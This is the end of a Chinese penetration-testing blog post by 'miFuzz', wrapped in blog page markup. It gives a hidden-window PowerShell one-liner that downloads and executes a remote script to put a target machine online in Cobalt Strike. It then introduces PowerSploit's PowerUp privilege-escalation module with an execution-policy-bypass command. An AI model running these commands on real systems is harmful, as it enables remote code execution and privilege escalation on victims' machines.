+<p>靶机执行代码上线CS</p>
+<figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell.exe -nop -w <span class="hljs-keyword">hidden</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">"IEX ((new-object net.webclient).downloadstring('http://192.168.1.133:80/a'))"</span><br></code></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://fastly.jsdelivr.net/gh/honexz/typora_image/image-20240322101959748.png" srcset="/img/loading.gif" lazyload alt="image-20240322101959748"></p>
+<h2 id="PowerUp模块"><a href="#PowerUp模块" class="headerlink" title="PowerUp模块"></a>PowerUp模块</h2><p>PowerUp是一个用于Windows操作系统的PowerShell脚本库和框架，用于自动化渗透测试和漏洞利用过程。它提供了大量的功能和工具，可用于发现、利用和绕过Windows系统中的各种安全漏洞。PowerUp模块是PowerSploit项目中的一个子模块，专注于Windows系统的特权升级和漏洞利用。</p>
+<p>github项目地址： <a class="btn" href="https://github.com/PowerShellMafia/PowerSploit" title="前往.." target="_blank">PowerSploit</a></p>
+<h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="Invoke-AllChecks"><a href="#Invoke-AllChecks" class="headerlink" title="Invoke-AllChecks"></a>Invoke-AllChecks</h4><p>该模块会自动执行PowerUp下的所有脚本检查目标主机</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -<span class="hljs-built_in">exec</span> bypass <span class="hljs-string">"import-module .\PowerUp.ps1;Invoke-AllChecks"</span><br></code></pre></td></tr></tbody></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>powershell</div>
+      <div>https://blog.dbii.top/posts/2c58b17a/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>miFuzz</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月27日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2024年3月27日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                    <i class="iconfont icon-nd"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/b405b4e9/" title="网络隐式保护的再延申">
+                        <span class="hidden-mobile">网络隐式保护的再延申</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a>© 2023  </a> <i class="iconfont icon-love"></i> <a href="https://blog.dbii.top/about" target="_blank" rel="nofollow noopener"><span>miFuzz</span></a> </br> <a>最难开口的事情就是 初次的问好 和最终的道别</a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
